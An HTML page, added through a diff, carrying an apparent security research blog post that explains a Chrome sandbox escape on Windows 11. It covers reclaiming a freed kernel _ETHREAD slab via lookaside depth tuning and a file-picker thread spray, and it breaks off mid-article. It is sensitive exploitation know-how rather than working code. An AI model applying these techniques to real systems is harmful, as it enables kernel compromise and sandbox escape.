@@ -1,0 +1,1591 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;p&gt;Hello! This is gongjae, back with Step 6 of the Wipeload project~!! We&amp;#x2019;re already at Step 6&amp;#x2026;! Shall we look back at the road we&amp;#x2019;ve walked so far?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Previous articles&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/&#34;&gt;https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/&#34;&gt;https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/&#34;&gt;https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/&#34;&gt;https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/07/19/gongjae/Wipeload_step5/EN/&#34;&gt;https://hackyboiz.github.io/2026/07/19/gongjae/Wipeload_step5/EN/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;In Step 1, OUYA77 drew the picture of the entire chain, and in Steps 2~3, ji9umi showed us renderer RCE and the V8 heap sandbox bypass. In Step 4, OUYA77 came back to take apart how the Chrome sandbox locks itself down, and in Step 5, I covered ALPC and the &lt;code&gt;ALPC_MSGFLG_SYNC_REQUEST&lt;/code&gt; Use-After-Free. Today, in Step 6, we&amp;#x2019;re going to revive that UAF into an arbitrary &lt;strong&gt;Read/Write primitive&lt;/strong&gt;, use it as a foothold to reach &lt;strong&gt;Medium-integrity code execution&lt;/strong&gt;, and finally pull off a real &lt;strong&gt;SandBox Escape&lt;/strong&gt; &amp;#x2014; on our way to meet Master Shifu!&lt;/p&gt;
+&lt;h1 id=&#34;1-From-Crash-to-Primitive&#34;&gt;&lt;a href=&#34;#1-From-Crash-to-Primitive&#34; class=&#34;headerlink&#34; title=&#34;1. From Crash to Primitive&#34;&gt;&lt;/a&gt;1. From Crash to Primitive&lt;/h1&gt;&lt;p&gt;Alright, shall we pull up the final scene from Step 5 once more?&lt;/p&gt;
+&lt;p&gt;We planted the trigger DLL inside the renderer with sRDI, then killed &amp;#x2014; mid-flight &amp;#x2014; the thread that had a SYNC message posted via &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt;, which freed the &lt;code&gt;_ETHREAD&lt;/code&gt;. And the moment we closed the port, &lt;code&gt;AlpcpCancelMessage&lt;/code&gt; fired a write at &lt;code&gt;+0x578&lt;/code&gt; of that already-dead address. And this was the result.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image2.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A BSOD means we&amp;#x2019;re done, right..? &lt;del&gt;it blew up in the kernel, so it counts as an escape&lt;/del&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Yeah.. honestly, this is where I started overthinking too.. As I hinted at the end of Step 5, Theori&amp;#x2019;s blog post also said something like &amp;#x201C;use the file picker, do a thread spray, blah blah blah, and you get code execution at Medium integrity&amp;#x201D;~..&lt;/p&gt;
+&lt;p&gt;A BSOD only proves one thing: &amp;#x201C;the kernel stepped on a dead pointer.&amp;#x201D; But that&amp;#x2019;s not what we want! We have to turn that dead pointer into &lt;strong&gt;a tool that reads and writes values we choose, at addresses we choose&lt;/strong&gt;. A crash and a primitive really are completely different things. The road from the blue screen to cmd is much longer than you&amp;#x2019;d think~..&amp;#x1F972;&lt;/p&gt;
+&lt;p&gt;But gongjae isn&amp;#x2019;t one to back down. I put my brain to work and first picked out what we&amp;#x2019;d actually need for a SandBox Escape.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;How do we turn the UAF into reading and writing the values we want, at the addresses we want? - reclaim?&lt;/li&gt;
+&lt;li&gt;Which process do we get to perform that reclaim for us? - file picker?&lt;/li&gt;
+&lt;li&gt;Once we can read and write, what do we overwrite to take over execution flow? - vtable?&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;It&amp;#x2019;s funny that they all end in question marks, but erasing those question marks one by one is exactly the goal of today&amp;#x2019;s article~!&amp;#x1F604; So let&amp;#x2019;s start with number 1!&lt;/p&gt;
+&lt;p&gt;What we freed in Step 5 was the kernel pool slab that an &lt;code&gt;_ETHREAD&lt;/code&gt; object was sitting in. The kernel takes that memory back right away and gets it ready to hand out to the next allocation. So there&amp;#x2019;s exactly one thing left for us to do: fill that spot back up with a fresh &lt;code&gt;_ETHREAD&lt;/code&gt; belonging to a process of our choosing! That is exactly what reclaim is.&lt;/p&gt;
+&lt;p&gt;What happens if this succeeds? The &lt;code&gt;WaitingThread&lt;/code&gt; pointer left behind in the message stops being a &amp;#x201C;dead address&amp;#x201D;. &lt;strong&gt;It now points at a live &lt;code&gt;_ETHREAD&lt;/code&gt;&lt;/strong&gt; inside a process we control. At that moment, the UAF transforms from a mere crash generator into a cross-process R/W window!!&lt;/p&gt;
+&lt;p&gt;Why is this hard, you ask? Because the kernel pool isn&amp;#x2019;t that naive.. You have to know, down to the bone, where a freed slab actually goes and by what rules it gets reused&amp;#x2026; &amp;#x1F643; Before we dive in: the native code running inside the renderer today is a modified version of that trigger DLL from Step 5, so for convenience I&amp;#x2019;ll just call it the &lt;strong&gt;exploit DLL&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;The test environment is identical to Step 5.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;H&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;  &amp;#xB7;  ntoskrnl &lt;span class=&#34;hljs-number&#34;&gt;22621&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;963&lt;/span&gt;
+&lt;span class=&#34;hljs-attribute&#34;&gt;Chrome&lt;/span&gt; for Testing &lt;span class=&#34;hljs-number&#34;&gt;114&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;5708&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Also, the Driver Verifier we turned on in Step 5 to make sure we&amp;#x2019;d see the BSOD is turned off this time. Special pool unmaps freed slabs entirely, so leaving it on would make today&amp;#x2019;s whole topic &amp;#x2014; reclaim &amp;#x2014; impossible!!&lt;/p&gt;
+&lt;h2 id=&#34;1-1-VS-allocator-ETHREAD-slab&#34;&gt;&lt;a href=&#34;#1-1-VS-allocator-ETHREAD-slab&#34; class=&#34;headerlink&#34; title=&#34;1.1 VS allocator _ETHREAD slab&#34;&gt;&lt;/a&gt;1.1 &lt;strong&gt;VS allocator&lt;/strong&gt; _ETHREAD slab&lt;/h2&gt;&lt;p&gt;First, let&amp;#x2019;s confirm the identity of the slab we&amp;#x2019;re up against.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs sqf&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;_ETHREAD&lt;/span&gt;)    = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x900           &lt;span class=&#34;hljs-comment&#34;&gt;// object size the kernel allocates&lt;/span&gt;
+pool block (actual) = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xa80           &lt;span class=&#34;hljs-comment&#34;&gt;// what !pool reports&lt;/span&gt;
+tag                 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Thre&amp;apos;&lt;/span&gt;          &lt;span class=&#34;hljs-comment&#34;&gt;// protected&lt;/span&gt;
+pool &lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt;           = NonPagedPoolNx&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;These two numbers are exactly where it gets confusing. &lt;code&gt;0x900&lt;/code&gt; is only ever the object size; the block that actually comes off the pool is &lt;code&gt;0xa80&lt;/code&gt;. &lt;code&gt;_POOL_HEADER&lt;/code&gt;, &lt;code&gt;_OBJECT_HEADER&lt;/code&gt;, sub-headers, and the VS chunk header all get piled on before and after, and then it gets rounded up to the VS allocator&amp;#x2019;s size class.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image3.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So the size class we&amp;#x2019;re competing over during reclaim is not &lt;code&gt;0x900&lt;/code&gt; but &lt;strong&gt;&lt;code&gt;0xa80&lt;/code&gt;&lt;/strong&gt;. When picking the slab out by eye, it&amp;#x2019;s easiest to scan the &lt;code&gt;!pool&lt;/code&gt; output for the size &lt;code&gt;a80&lt;/code&gt; + &lt;code&gt;*Thre&lt;/code&gt; combination. The &lt;code&gt;(Protected)&lt;/code&gt; printed next to it means the pool tag carries a protection bit &amp;#x2014; a kernel-side safeguard that only accepts a free when the tag matches. We aren&amp;#x2019;t calling free ourselves; we&amp;#x2019;re targeting a spot the kernel freed while tearing a thread down, so this never gets in our way.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image4.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Also, since Win10 19H1 the kernel pool is a segment heap, so which allocator handles a request depends on the size. Anything under &lt;code&gt;0x200&lt;/code&gt; goes to kLFH, &lt;code&gt;0x200&lt;/code&gt; through &lt;code&gt;0x20000&lt;/code&gt; goes to the &lt;strong&gt;VS allocator&lt;/strong&gt;, and anything larger goes to segment/large. The block-&lt;code&gt;0xa80&lt;/code&gt; &lt;code&gt;_ETHREAD&lt;/code&gt; falls into the second one &amp;#x2014; in other words, the &lt;strong&gt;VS allocator&lt;/strong&gt; manages it. Everything in today&amp;#x2019;s reclaim happens inside this allocator.&lt;/p&gt;
+&lt;p&gt;And the allocation path looks like this.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;NtCreateThreadEx&lt;/span&gt; &amp;#x2192; PspAllocateThread &amp;#x2192; ObpAllocateObject &amp;#x2192; ExAllocatePool&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The only entrance that hands this slab out is, in the end, &lt;code&gt;NtCreateThreadEx&lt;/code&gt; &amp;#x2014; which means &lt;strong&gt;if anybody creates one thread, one &lt;code&gt;0xa80&lt;/code&gt; block goes out&lt;/strong&gt;. The answer to why the thread spray I teased earlier actually works is packed entirely into this one line.&lt;/p&gt;
+&lt;h2 id=&#34;1-2-Dynamic-Lookaside&#34;&gt;&lt;a href=&#34;#1-2-Dynamic-Lookaside&#34; class=&#34;headerlink&#34; title=&#34;1.2 Dynamic Lookaside&#34;&gt;&lt;/a&gt;1.2 Dynamic Lookaside&lt;/h2&gt;&lt;p&gt;But here&amp;#x2019;s the thing &amp;#x2014; there&amp;#x2019;s one more layer of cache sitting in front of the VS allocator. It&amp;#x2019;s the &lt;code&gt;_RTL_DYNAMIC_LOOKASIDE&lt;/code&gt; structure that &lt;code&gt;_SEGMENT_HEAP.UserContext&lt;/code&gt; points to, and honestly, this guy is the real main character of today&amp;#x2019;s story!&lt;/p&gt;
+&lt;p&gt;Shall we check the structure directly in kd first?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; dt nt!_RTL_DYNAMIC_LOOKASIDE
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; EnabledBucketBitmap : Uint8B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x008&lt;/span&gt; BucketCount         : Uint4B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x00c&lt;/span&gt; ActiveBucketCount   : Uint4B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x040&lt;/span&gt; Buckets             : [&lt;span class=&#34;hljs-number&#34;&gt;64&lt;/span&gt;] _RTL_LOOKASIDE
+
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; dt nt!_RTL_LOOKASIDE
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; ListHead            : _SLIST_HEADER
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x010&lt;/span&gt; Depth               : Uint2B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x012&lt;/span&gt; MaximumDepth        : Uint2B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x014&lt;/span&gt; TotalAllocates      : Uint4B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; AllocateMisses      : Uint4B
+   ...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;More boring than you expected, right? There are 64 buckets, and each bucket is just a single SLIST. The behavior fits in two lines.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs livecodeserver&#34;&gt;free  &amp;#x2192; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;the&lt;/span&gt; bucket is enabled &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; depth has room &amp;#x2192; PUSH  (&lt;span class=&#34;hljs-built_in&#34;&gt;put&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;it&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;top&lt;/span&gt;)
+alloc &amp;#x2192; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;the&lt;/span&gt; size matches                        &amp;#x2192; POP   (take &lt;span class=&#34;hljs-keyword&#34;&gt;it&lt;/span&gt; off &lt;span class=&#34;hljs-keyword&#34;&gt;the&lt;/span&gt; top)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As you can probably tell, it&amp;#x2019;s &lt;strong&gt;LIFO&lt;/strong&gt;. It means the order of frees and allocs maps one-to-one. Just arrange a &amp;#x201C;free &amp;#x2192; alloc immediately after&amp;#x201D; ordering, and that alloc takes &lt;strong&gt;the very slab we just freed&lt;/strong&gt;. That&amp;#x2019;s why this reclaim isn&amp;#x2019;t a probabilistic spray where you scatter tens of thousands and wait for one to stick &amp;#x2014; it becomes &lt;strong&gt;a matter of getting the order right&lt;/strong&gt;! &amp;#x1F60E;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image5.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The freed slab lands on top of the SLIST, and the next &lt;code&gt;0xa80&lt;/code&gt; alloc POPs it right back off.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The fact that a lookaside is by design a thing that &amp;#x201C;caches fixed-size blocks and lets the system tune the depth on its own&amp;#x201D;, and that SLIST push/pop is an atomic LIFO, is spelled out in the MS docs exactly as-is.&lt;/p&gt;
+&lt;p&gt;But notice there was a condition quietly attached to those two lines: &amp;#x201C;if depth has room&amp;#x201D;. So what does this &lt;code&gt;Depth&lt;/code&gt; actually mean?&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s start with initialization. &lt;code&gt;RtlpDynamicLookasideInitialize&lt;/code&gt; walks all 64 buckets and stamps in this one line.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;mov qword ptr [rbx&lt;span class=&#34;hljs-number&#34;&gt;-2&lt;/span&gt;], &lt;span class=&#34;hljs-number&#34;&gt;1000000&lt;/span&gt;h     ; one &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;-byte store &lt;span class=&#34;hljs-built_in&#34;&gt;int&lt;/span&gt;o Buckets[n]+&lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Unpack it little-endian and it lands exactly on the fields we saw earlier with &lt;code&gt;dt&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;   &amp;#x2192;  Depth        = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
++&lt;span class=&#34;hljs-number&#34;&gt;0x12&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;01&lt;/span&gt;   &amp;#x2192;  MaximumDepth = &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; (&lt;span class=&#34;hljs-number&#34;&gt;256&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The maximum depth is 256, but the starting depth is 0. A freshly initialized bucket caches nothing at all. A freed slab can&amp;#x2019;t land on the SLIST and drops straight into the VS backend&amp;#x2019;s RB-tree. Reclaim can&amp;#x2019;t even get started.&lt;/p&gt;
+&lt;p&gt;So when does this &lt;code&gt;Depth&lt;/code&gt; actually grow? Tearing apart &lt;code&gt;RtlpLookasideAdjustDepth&lt;/code&gt; gives us these rules.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;nt!RtlpLookasideAdjustDepth+0x0b:
+  sub    ecx,  [r9+24h]             ; ecx  = allocs in this window
+  ...
+  sub    r10d, [r9+28h]             ; r10d = misses in this window
+  ...
+
++0x3a:
+  movzx  r8d,  word ptr [r9+10h]    ; r8d  = Depth         &amp;#x2190; current allowance
+  cmovbe eax,  r10d                 ; eax  = min(allocs, misses)
+  movzx  r10d, word ptr [r9+12h]    ; r10d = MaximumDepth  &amp;#x2190; maximum depth
+  test   ecx, ecx
+  cmovz  ecx, r11d                  ; allocs 0 &amp;#x2192; 1        &amp;#x2190; divide-by-zero guard
+  imul   eax, eax, 3E8h             ;  &amp;#xD7; 1000
+  div    ecx                        ;  &amp;#x2192; eax = miss rate (per mille)
+  cmp    ecx, 19h                   ; if the previous window had fewer than 25 allocs
+  jb     +0xae                      ;  &amp;#x2192; just shrink it
+
++0x68:
+  cmp    eax, 5                     ; if the miss rate is 0.5% or higher
+  jae    +0x7e                      ;  &amp;#x2192; go grow it
+
++0x6d:
+  sub    r8d, r11d                  ; Depth -= 1
+
++0x70:
+  mov    eax, 4
+  cmp    r8d, eax
+  cmovle r8d, eax                   ; floor 4
+  jmp    +0x2e                      ;  &amp;#x2192; store
+
++0x7e:
+  mov    ecx, r10d
+  sub    ecx, r8d                   ; headroom = MaximumDepth - Depth
+  imul   ecx, eax                   ;  &amp;#xD7; miss rate
+  ...                               ;  ( &amp;#xF7; 1000 )
+  add    edx, 5
+  mov    eax, 1Eh
+  cmovae edx, eax                   ; at most +30 per adjustment
+  lea    eax, [rdx+r8]
+  cmp    eax, r10d
+  mov    r8d, eax
+  cmovge r8d, r10d                  ; up to the maximum depth
+
++0xae:
+  sub    r8d, 0Ah                   ; Depth -= 10
+  jmp    +0x70                      ;  &amp;#x2192; to the floor clamp&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;r8d&lt;/code&gt; is &lt;code&gt;Depth&lt;/code&gt; and &lt;code&gt;r10d&lt;/code&gt; is &lt;code&gt;MaximumDepth&lt;/code&gt;. Follow just those two and the rest reads itself. There are three branches, and the two that shrink all converge on &lt;code&gt;+0x70&lt;/code&gt; at the end &amp;#x2014; the &lt;code&gt;-10&lt;/code&gt; one even jumps back for it. The &lt;code&gt;cmp r8d, eax&lt;/code&gt; / &lt;code&gt;cmovle r8d, eax&lt;/code&gt; sitting there is the easiest way to think about why the floor ends up being 4. The branch that grows clamps against the maximum depth on its own and leaves.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image6.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;fewer&lt;/span&gt; than &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt; allocs in the last window  &amp;#x2192;  Depth -&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;
+&lt;span class=&#34;hljs-attribute&#34;&gt;miss&lt;/span&gt; rate below &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;%                     &amp;#x2192;  Depth -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;
+&lt;span class=&#34;hljs-attribute&#34;&gt;otherwise&lt;/span&gt;                                &amp;#x2192;  Depth += up to &lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;
+                                             &lt;span class=&#34;hljs-attribute&#34;&gt;floor&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, up to MaximumDepth&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;Depth&lt;/code&gt; only grows when misses happen. That means an alloc has to come in against an empty bucket.&lt;/p&gt;
+&lt;p&gt;So this &lt;code&gt;Depth&lt;/code&gt; isn&amp;#x2019;t the number of items currently held &amp;#x2014; it&amp;#x2019;s an allowance deciding how many will be accepted. The actual count lives separately inside &lt;code&gt;ListHead&lt;/code&gt;, and this function never touches the SLIST at all &amp;#x2014; it only edits the allowance number. So when it goes &lt;code&gt;-10&lt;/code&gt; above, it doesn&amp;#x2019;t mean cached slabs get thrown away &amp;#x2014; it means the headroom for accepting future ones shrinks.&lt;/p&gt;
+&lt;aside&gt;
+&amp;#x1F4A1;
+
+To sum up, this bucket only opens once you convince the kernel that it&amp;apos;s a **&amp;quot;frequently used size&amp;quot;**.
+
+This is exactly why the `prime_lookaside` we&amp;apos;ll see later keeps creating and destroying threads. It isn&amp;apos;t trying to pre-fill the slots &amp;#x2014; it&amp;apos;s **deliberately generating misses to push `Depth` up**.
+
+&lt;/aside&gt;
+
+&lt;p&gt;Of course, in practice this ordering does get broken sometimes, and sometimes a completely unrelated allocation snatches the slab I freed first. So now it&amp;#x2019;s time to look at how we stop that, and who we get to take the spot, right?&lt;/p&gt;
+&lt;h1 id=&#34;2-Taking-the-Slab-Back&#34;&gt;&lt;a href=&#34;#2-Taking-the-Slab-Back&#34; class=&#34;headerlink&#34; title=&#34;2. Taking the Slab Back&#34;&gt;&lt;/a&gt;2. Taking the Slab Back&lt;/h1&gt;&lt;p&gt;Chapter 1 gave us all the conditions. &lt;strong&gt;An alloc just has to come right after the free, and it doesn&amp;#x2019;t matter if that alloc belongs to somebody else&amp;#x2019;s process.&lt;/strong&gt; So now we can actually go do it! &amp;#x2026; is what I thought, but of course it doesn&amp;#x2019;t work.. &amp;#x1F607;&lt;/p&gt;
+&lt;h2 id=&#34;2-1-Two-Reasons-Reclaim-Doesn&amp;#x2019;t-Just-Work&#34;&gt;&lt;a href=&#34;#2-1-Two-Reasons-Reclaim-Doesn&amp;#x2019;t-Just-Work&#34; class=&#34;headerlink&#34; title=&#34;2.1 Two Reasons Reclaim Doesn&amp;#x2019;t Just Work&#34;&gt;&lt;/a&gt;2.1 Two Reasons Reclaim Doesn&amp;#x2019;t Just Work&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;If the bucket isn&amp;#x2019;t warmed up, you can&amp;#x2019;t even start&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This is the thing we just saw. If &lt;code&gt;Depth&lt;/code&gt; is close to 0, the slab I freed can&amp;#x2019;t get onto the SLIST. It flows straight into the VS backend&amp;#x2019;s RB-tree. At that point LIFO becomes somebody else&amp;#x2019;s story, and nobody knows where the next &lt;code&gt;0xa80&lt;/code&gt; allocation will pick anything up from.&lt;/p&gt;
+&lt;p&gt;And this doesn&amp;#x2019;t just end in a plain &amp;#x201C;failure&amp;#x201D;. The RB-tree side does best-fit plus coalescing, so the contents of the slab that comes back are completely scrambled. Later the kernel believes that spot is an &lt;code&gt;_ETHREAD&lt;/code&gt; and reads a fixed offset (we&amp;#x2019;ll see exactly where in Chapter 3), and if what&amp;#x2019;s sitting there is garbage, the kernel dies right on the spot. So the price of a failed reclaim is, once again, a BSOD..&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Somebody else grabs it first&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Hard LIFO, flipped around, also means &lt;strong&gt;whoever cuts in line owns it&lt;/strong&gt;. If even a single identical &lt;code&gt;0xa80&lt;/code&gt; allocation cuts in between the moment I free and the moment the process I want allocates, that slab goes to them.&lt;/p&gt;
+&lt;p&gt;The problem is that this &amp;#x201C;somebody else&amp;#x201D; is usually ourselves!!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image7.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The Chromium renderer creates and destroys threads even when it&amp;#x2019;s sitting idle. Thread pools, IO, Mojo&amp;#x2026; it&amp;#x2019;s all noise.&lt;/li&gt;
+&lt;li&gt;Even the &lt;code&gt;prime_lookaside&lt;/code&gt; threads I create myself to warm the bucket are competitors.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;What happens if our own renderer takes that spot? The dangling pointer ends up &lt;strong&gt;pointing at itself&lt;/strong&gt;. From the kernel&amp;#x2019;s point of view everything works perfectly fine, but we end up reading and writing a renderer that&amp;#x2019;s locked inside the Untrusted IL sandbox. There&amp;#x2019;s no way out.&lt;/p&gt;
+&lt;p&gt;To sum up, reclaim has to clear two gates: keeping the bucket open, and making sure the process I want is the one that takes the spot. Let&amp;#x2019;s start with the second. Once we know who fills it, we also know when to warm the bucket &amp;#x2014; so who on earth is going to create threads on my behalf?&lt;/p&gt;
+&lt;h2 id=&#34;2-2-Thread-Spray-via-the-File-Picker&#34;&gt;&lt;a href=&#34;#2-2-Thread-Spray-via-the-File-Picker&#34; class=&#34;headerlink&#34; title=&#34;2.2 Thread Spray via the File Picker&#34;&gt;&lt;/a&gt;2.2 Thread Spray via the File Picker&lt;/h2&gt;&lt;p&gt;There was only one thing we needed: a Medium IL process that creates threads on our timing!&lt;/p&gt;
+&lt;p&gt;But we&amp;#x2019;re locked inside an Untrusted IL renderer. There&amp;#x2019;s no way to tell somebody else&amp;#x2019;s process &amp;#x201C;hey, make me a thread&amp;#x201D;. If such a way exists, it can only be a path Chrome itself was built to take, right? And that path is the file picker!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;window&lt;/span&gt;.showOpenFilePicker();&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With this one line, the renderer calls &lt;code&gt;UtilWin::CallExecuteSelectFile&lt;/code&gt; over Mojo, and the browser spawns a separate process called util_win. Look at the command line and you&amp;#x2019;ll immediately see why this is our target.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image8.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs fsharp&#34;&gt;--utility-sub-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt;&lt;/span&gt;=chrome.mojom.UtilWin
+--service-sandbox-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt;&lt;/span&gt;=none&lt;/code&gt;&lt;/pre&gt;
